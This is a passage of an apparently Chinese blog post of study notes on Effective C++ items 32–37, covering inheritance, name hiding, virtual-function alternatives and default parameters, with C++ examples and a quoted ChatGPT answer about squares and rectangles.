高层模块不应该依赖于低层模块，它们都应该依赖于抽象。抽象不应该依赖于具体实现细节，而具体实现细节应该依赖于抽象。这个原则通过将高层模块和低层模块都依赖于抽象，实现了模块间的解耦合，提高了代码的灵活性和可维护性。</li></ol></blockquote><h3 id="32-Make-sure-public-inheritance-models-“is-a”"><a href="#32-Make-sure-public-inheritance-models-“is-a”" class="headerlink" title="32. Make sure public inheritance models “is-a”"></a>32. Make sure public inheritance models “is-a”</h3><ul><li>里氏替换原则：即<code>父类</code>比<code>子类</code>表现出更一般的概念，<code>子类</code>比<code>父类</code>表现出更特殊化的一般概念。如果子类对象可以替换掉父类对象，并且程序行为不变，则这种继承关系是合理的。</li><li>我们因此可以推出任何函数如果期望获得一个类型为Person（或pointer-to-Person 或reference-to- Person) 的实参，都也愿意接受一个Student对象（或pointer-to-student或reference-to-Student） :</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;... &#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>: <span class="keyword">public</span> Person &#123;... &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">eat</span><span class="params">(<span class="type">const</span> Person&amp; p)</span></span>; <span class="comment">// 任何人都会吃</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">study</span><span class="params">(<span class="type">const</span> Student&amp; s)</span></span>; <span class="comment">// 只有学生才会去学校学习</span></span><br><span class="line"></span><br><span class="line">Person p; <span class="comment">// p 是人</span></span><br><span class="line">Student s; <span class="comment">// s 是学生</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">eat</span>(p); <span class="comment">// 没问题，p 是人</span></span><br><span class="line"><span class="built_in">eat</span>(s); <span class="comment">// 没问题，s 是学生，而学生也是（is-a）人</span></span><br><span class="line"><span class="built_in">study</span>(s); <span class="comment">// 没问题，s 是个学生</span></span><br><span class="line"><span class="built_in">study</span>(p); <span class="comment">// 错误！p 不是个学生，不能调用 study 函数</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="企鹅和它的鸟事"><a href="#企鹅和它的鸟事" class="headerlink" title="企鹅和它的鸟事"></a>企鹅和它的鸟事</h4><p>我们知道大多数鸟是会飞的，而企鹅也是鸟（我也是第一次知道；）),那我们因该如何处理这个鸟类呢？</p><p>来看看有几种方法：</p><ol><li>我们把企鹅与会飞的鸟分开</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Bird</span> &#123;</span><br><span class="line">  ...                                       <span class="comment">// 没有声明飞行函数</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FlyingBird</span>: <span class="keyword">public</span> Bird &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">fly</span><span class="params">()</span></span>;</span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Penguin</span>: <span class="keyword">public</span> Bird &#123;</span><br><span class="line"></span><br><span class="line">  ...                                       <span class="comment">// 没有声明飞行函数</span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li>产生一个运行时错误</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">error</span><span class="params">(<span class="type">const</span> std::string&amp; msg)</span></span>;       <span class="comment">// 定义在别处</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Penguin</span>: <span class="keyword">public</span> Bird &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">fly</span><span class="params">()</span> </span>&#123; <span class="built_in">error</span>(<span class="string">&quot;Attempt to make a penguin fly!&quot;</span>);&#125;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ol><li>在编译期拒绝企鹅飞行</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Bird</span> &#123;</span><br><span class="line">  ...                                <span class="comment">// 没有飞行成员函数被声明</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Penguin</span>: <span class="keyword">public</span> Bird &#123;</span><br><span class="line">  ...                                <span class="comment">//没有飞行成员函数被声明</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>条款18 说过：好的接口可以防止无效的代码通过编译，因此你应该宁可采取“在编译期拒绝企鹅飞行”的设计，而不是“只在运行期才能侦测它们”的设计。</li></ul><h4 id="正方形与矩形"><a href="#正方形与矩形" class="headerlink" title="正方形与矩形"></a>正方形与矩形</h4><p>正方形应该以public形式继承矩形吗？</p><blockquote><p>我：正方形应该以public形式继承矩形吗？</p><p>ChatGPT：</p><p>从面向对象设计的角度来看，正方形是否应该以公共形式继承矩形取决于所选择的模型和设计目标。</p><p>在数学上，正方形是矩形的一种特殊情况，因此从继承的角度来看，正方形确实可以被视为是矩形的一种。然而，在编程中，继承关系通常应该反映出真正的”is-a”关系。换句话说，如果子类对象在所有情况下都可以替代父类对象而不产生任何副作用，那么继承关系才是适当的。</p><p>在一般情况下，正方形与矩形之间的继承关系并不符合”is-a”关系。尽管正方形确实是一种特殊的矩形，但它们在行为和属性上可能会有所不同。例如，矩形通常具有长度和宽度两个属性，而正方形则具有相等的边长。如果以公共形式继承矩形，那么正方形将继承矩形的长度和宽度属性，这可能会导致一些不符合预期的行为。</p><p>因此，在大多数情况下，正方形不应该以公共形式继承矩形。相反，可以考虑使用组合或私有继承来实现正方形与矩形之间的关系。例如，可以将正方形类内部包含一个矩形对象，并在必要时委托给它，以实现代码的复用和灵活性。</p></blockquote><h4 id="请记住"><a href="#请记住" class="headerlink" title="请记住"></a>请记住</h4><ul><li>“public 继承“意味is-a 。适用于base classes 身上的每一件事情一定也适用于derived classes 身上，因为每一个derived class 对象也都是一个base class 对象。</li></ul><h3 id="33-A-void-hiding-inherited-names"><a href="#33-A-void-hiding-inherited-names" class="headerlink" title="33. A void hiding inherited names."></a>33. A void hiding inherited names.</h3><ul><li><code>内层作用域的名称会遮掩（遮蔽）外围作用域的名称</code>。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="type">int</span> x = <span class="number">0721</span>;                        <span class="comment">// 全局变量</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">double</span> x = <span class="number">114.514</span>;                   <span class="comment">// 局部变量</span></span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; x;              <span class="comment">// 读取局部变量 x 的新值</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//输出 114.514</span></span><br></pre></td></tr></table></figure><ul><li>那么延伸到继承上，当子类继承了父类并且父类和子类中存在同名的成员函数或成员变量时，子类会覆盖（隐藏）父类中相同名称的成员函数或成员变量。</li></ul><p>那么，我们有什么方法来使用父类的成员变量呢？</p><ol><li>通过<code>using声明式</code></li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Base</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  <span class="type">int</span> x;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">mf1</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">mf1</span><span class="params">(<span class="type">int</span>)</span></span>;</span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">mf2</span><span class="params">()</span></span>;</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">mf3</span><span class="params">()</span></span>;</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">mf3</span><span class="params">(<span class="type">double</span>)</span></span>;</span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Derived</span>: <span class="keyword">public</span> Base &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="keyword">using</span> Base::mf1;       <span class="comment">// make all things in Base named mf1 and mf3</span></span><br><span class="line">  <span class="keyword">using</span> Base::mf3;       <span class="comment">// visible (and public) in Derived&#x27;s scope</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">mf1</span><span class="params">()</span></span>;</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">mf3</span><span class="params">()</span></span>;</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">mf4</span><span class="params">()</span></span>;</span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Derived d;</span><br><span class="line"><span class="type">int</span> x;</span><br><span class="line">d.<span class="built_in">mf1</span>();                 <span class="comment">// 仍然可以，仍然调用 Derived::mf1</span></span><br><span class="line">d.<span class="built_in">mf1</span>(x);                <span class="comment">// 现在可以了，调用 Base::mf1</span></span><br><span class="line">d.<span class="built_in">mf2</span>();                 <span class="comment">// 仍然可以，仍然调用 Base::mf2</span></span><br><span class="line">d.<span class="built_in">mf3</span>();                 <span class="comment">// 可以，调用 Derived::mf3</span></span><br><span class="line">d.<span class="built_in">mf3</span>(x);                <span class="comment">// 现在可以了，调用 Base::mf3</span></span><br></pre></td></tr></table></figure><p>如果你继承base class 并加上重载函数，而你又希望重新定义或覆写（推翻）其中一部分，那么你必须为那些原本会被遮掩的每个名称引入一个using 声明式，否则某些你希望继承的名称会被遮掩。</p><ol><li>转交函数</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Base</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">mf1</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">mf1</span><span class="params">(<span class="type">int</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">  ...                                    <span class="comment">// 如前</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Derived</span>: <span class="keyword">private</span> Base &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">mf1</span><span class="params">()</span>                   <span class="comment">// 转发函数；隐式内联（参见 Item 30）</span></span></span><br><span class="line"><span class="function">  </span>&#123; Base::<span class="built_in">mf1</span>(); &#125;                     <span class="comment">// 内联实现</span></span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Derived d;</span><br><span class="line"><span class="type">int</span> x;</span><br><span class="line"></span><br><span class="line">d.<span class="built_in">mf1</span>();                               <span class="comment">// 可以，调用 Derived::mf1</span></span><br><span class="line">d.<span class="built_in">mf1</span>(x);                              <span class="comment">// 错误！Base::mf1() 被隐藏</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="请记住-1"><a href="#请记住-1" class="headerlink" title="请记住"></a>请记住</h4><ul><li>derived classes 内的名称会遮掩base classes 内的名称。在public 继承下从来没有人希望如此。</li><li>为了让被遮掩的名称重见天日，可使用using 声明式或转交函数(forwarding functions) 。</li></ul><h3 id="34-Differentiate-between-inheritance-of-interface-and-inheritance-of-implementation"><a href="#34-Differentiate-between-inheritance-of-interface-and-inheritance-of-implementation" class="headerlink" title="34. Differentiate between inheritance of interface and inheritance of implementation."></a>34. Differentiate between inheritance of interface and inheritance of implementation.</h3><p>表面上直截了当的public 继承概念，经过更严密的检查之后，发现它由两部分组成：<code>函数接口(function interfaces) 继承</code>和<code>函数实现(function implementations)继承</code>。这两种继承的差异，很像本书导读所讨论的函数声明与函数定义之间的差异。</p><p>考虑如下函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Shape</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">draw</span><span class="params">()</span> <span class="type">const</span> </span>= <span class="number">0</span>; <span class="comment">// 纯虚函数，派生类必须实现</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">error</span><span class="params">(<span class="type">const</span> std::string&amp; msg)</span></span>; <span class="comment">// 虚函数，可被重写</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">objectID</span><span class="params">()</span> <span class="type">const</span></span>; <span class="comment">// 非虚函数，不可被重写</span></span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Rectangle</span>: <span class="keyword">public</span> Shape &#123; ... &#125;; <span class="comment">// 矩形类继承自形状类</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Ellipse</span>: <span class="keyword">public</span> Shape &#123; ... &#125;; <span class="comment">// 椭圆类继承自形状类</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><code>virtual</code> 关键字用于声明可以在派生类中被重写的虚函数，它可以有默认实现。<code>pure virtual</code> 关键字用于声明没有实现的虚函数，它要求派生类必须提供实现。纯虚函数的存在使得基类成为一个抽象类，无法实例化。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Shape *ps = <span class="keyword">new</span> Shape;              <span class="comment">// 错误！Shape 是抽象类</span></span><br><span class="line"></span><br><span class="line">Shape *ps1 = <span class="keyword">new</span> Rectangle;         <span class="comment">// 可以</span></span><br><span class="line">ps1-&gt;<span class="built_in">draw</span>();                     <span class="comment">// 调用 Rectangle::draw</span></span><br><span class="line"></span><br><span class="line">Shape *ps2 = <span class="keyword">new</span> Ellipse;           <span class="comment">// 可以</span></span><br><span class="line">ps2-&gt;<span class="built_in">draw</span>();                     <span class="comment">// 调用 Ellipse::draw</span></span><br><span class="line"></span><br><span class="line">ps1-&gt;Shape::<span class="built_in">draw</span>();                 <span class="comment">// 调用 Shape::draw</span></span><br><span class="line"></span><br><span class="line">ps2-&gt;Shape::<span class="built_in">draw</span>();                 <span class="comment">// 调用 Shape::draw</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>//TODO</p><h3 id="35-Consider-alternatives-to-virtual-functions"><a href="#35-Consider-alternatives-to-virtual-functions" class="headerlink" title="35. Consider alternatives to virtual functions"></a>35. Consider alternatives to virtual functions</h3><p>考虑一个健康值计算，由于每个角色计算方式不同，我们采用virtual方式</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">GameCharacter</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> <span class="type">int</span> <span class="title">healthValue</span><span class="params">()</span> <span class="type">const</span></span>;        <span class="comment">// 返回角色的健康值评级；派生类可以重新定义这个函数</span></span><br><span class="line">  ...                                     <span class="comment">// 派生类可以重新定义这个函数</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="借由Non-virtual-Interface-手法实现-Template-Method-模式"><a href="#借由Non-virtual-Interface-手法实现-Template-Method-模式" class="headerlink" title="借由Non-virtual Interface 手法实现 Template Method 模式"></a>借由Non-virtual Interface 手法实现 Template Method 模式</h4><p>保留healthValue 为<code>public 成员函数</code>，但让它成为<code>non-virtual</code>, 并调用一个<code>private(或protect) virtual 函数</code>（例如doHealthValue)进行实际工作：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">GameCharacter</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">healthValue</span><span class="params">()</span> <span class="type">const</span>               <span class="comment">// 派生类不需要重新定义此函数 - 参见条款36</span></span></span><br><span class="line"><span class="function">  </span>&#123;                                     <span class="comment">// 下方查看&quot;before&quot;和&quot;after&quot;的处理</span></span><br><span class="line">    ...                                 <span class="comment">// 执行 &quot;before&quot; 操作 - 见下文</span></span><br><span class="line">    <span class="type">int</span> retVal = <span class="built_in">doHealthValue</span>();       <span class="comment">// 进行实际工作</span></span><br><span class="line">    ...                                 <span class="comment">// 执行 &quot;after&quot; 操作 - 见下文</span></span><br><span class="line">    <span class="keyword">return</span> retVal;</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> <span class="type">int</span> <span class="title">doHealthValue</span><span class="params">()</span> <span class="type">const</span>     <span class="comment">// 派生类可以重新定义此函数</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    ...                                 <span class="comment">// 计算角色健康值的默认算法</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这种手法被称为<code>NVI</code>手法。这个<code>non-virtual</code>函数可被称为<code>virtual</code>函数的<code>外覆器</code>。即我们可以在计算健康值前和后做一些工作，如日志记录，互斥锁等。</p><h4 id="借由Functions-Pointers实现Strategy模式"><a href="#借由Functions-Pointers实现Strategy模式" class="headerlink" title="借由Functions Pointers实现Strategy模式"></a>借由Functions Pointers实现Strategy模式</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">GameCharacter</span>;                               <span class="comment">// 前向声明</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">defaultHealthCalc</span><span class="params">(<span class="type">const</span> GameCharacter&amp; gc)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">GameCharacter</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*HealthCalcFunc)</span><span class="params">(<span class="type">const</span> GameCharacter&amp;)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">explicit</span> <span class="title">GameCharacter</span><span class="params">(HealthCalcFunc hcf = defaultHealthCalc)</span></span></span><br><span class="line"><span class="function">  : healthFunc(hcf)</span></span><br><span class="line"><span class="function">  &#123;</span>&#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">healthValue</span><span class="params">()</span> <span class="type">const</span></span></span><br><span class="line"><span class="function">  </span>&#123; <span class="keyword">return</span> <span class="built_in">healthFunc</span>(*<span class="keyword">this</span>); &#125;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  HealthCalcFunc healthFunc;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">EvilBadGuy</span>: <span class="keyword">public</span> GameCharacter &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 构造函数，explicit 防止隐式类型转换</span></span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">EvilBadGuy</span><span class="params">(HealthCalcFunc hcf = defaultHealthCalc)</span></span></span><br><span class="line"><span class="function">        : GameCharacter(hcf)</span></span><br><span class="line"><span class="function">    &#123;</span> ... &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">loseHealthQuickly</span><span class="params">(<span class="type">const</span> GameCharacter&amp;)</span></span>;    <span class="comment">// 健康计算函数</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">loseHealthSlowly</span><span class="params">(<span class="type">const</span> GameCharacter&amp;)</span></span>;     <span class="comment">// 不同行为的函数</span></span><br><span class="line"></span><br><span class="line"><span class="function">EvilBadGuy <span class="title">ebg1</span><span class="params">(loseHealthQuickly)</span></span>;             <span class="comment">// 具有不同健康行为的相同类型角色</span></span><br><span class="line"><span class="function">EvilBadGuy <span class="title">ebg2</span><span class="params">(loseHealthSlowly)</span></span>;              <span class="comment">// 具有不同健康行为的相同类型角色</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通过<code>Strategy设计模式</code>，我们可以为不同角色设置不同策略，还可以在<code>运行时</code>修改策略（比如boss的不同阶段）</p><h4 id="请记住-2"><a href="#请记住-2" class="headerlink" title="请记住"></a>请记住</h4><h3 id="36-Never-redefine-an-inherited-non-virtual-function"><a href="#36-Never-redefine-an-inherited-non-virtual-function" class="headerlink" title="36. Never redefine an inherited non-virtual function."></a>36. Never redefine an inherited non-virtual function.</h3><ul><li><code>non-virtual</code>函数是静态绑定的，用什么指针（引用）调用mf()，调用的版本是<code>该指针的类型</code>。如base指针只能调用base的mf()，derived指针只能调用derived的mf()。</li><li><code>virtual</code>函数是动态绑定的。调用的mf()函数是根据你所指对象的类型来调用对应的成员函数mf()。</li></ul><p>正确做法</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">mf</span><span class="params">()</span> </span>&#123; <span class="comment">/* ... */</span> &#125;  <span class="comment">// 将此函数声明为虚函数</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">D</span>: <span class="keyword">public</span> B &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">mf</span><span class="params">()</span> <span class="keyword">override</span> </span>&#123; <span class="comment">/* ... */</span> &#125;  <span class="comment">// 使用 override 关键词明确指出是要重写基类的虚函数</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">B *pB = <span class="keyword">new</span> <span class="built_in">D</span>();</span><br><span class="line">pB-&gt;<span class="built_in">mf</span>();  <span class="comment">// 调用 D::mf，因为 mf 是虚函数，且 pB 指向 D 类型的对象</span></span><br><span class="line"></span><br><span class="line">D *pD = <span class="keyword">new</span> <span class="built_in">D</span>();</span><br><span class="line">pD-&gt;<span class="built_in">mf</span>();  <span class="comment">// 调用 D::mf</span></span><br></pre></td></tr></table></figure><h3 id="37-Never-redefine-a-function’s-inherited-default-parameter-value"><a href="#37-Never-redefine-a-function’s-inherited-default-parameter-value" class="headerlink" title="37. Never redefine a function’s inherited default parameter value."></a>37. Never redefine a function’s inherited default parameter value.</h3><p>我们能继承两种函数<code>virtual</code>函数和<code>non-virtual</code>函数，我们在上一节已经讨论了<code>non-virtual</code>函数继承，那么接下来聊一下<del>vtuber</del><code>virtual</code>继承吧。</p><p>敲重点：<code>virtual functions（虚拟函数）是 dynamically bound（动态绑定），而 default parameter values（缺省参数值）是 statically bound（静态绑定）。</code></p><h4 id="静态绑定（early-binding）与动态绑定（late-binding）"><a href="#静态绑定（early-binding）与动态绑定（late-binding）" class="headerlink" title="静态绑定（early binding）与动态绑定（late binding）"></a>静态绑定（early binding）与动态绑定（late binding）</h4><p>一个 object（对象）的 static type（静态类型）就是你在程序文本中声明给它的 type（类型）。考虑这个 class hierarchy（类继承体系）：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td 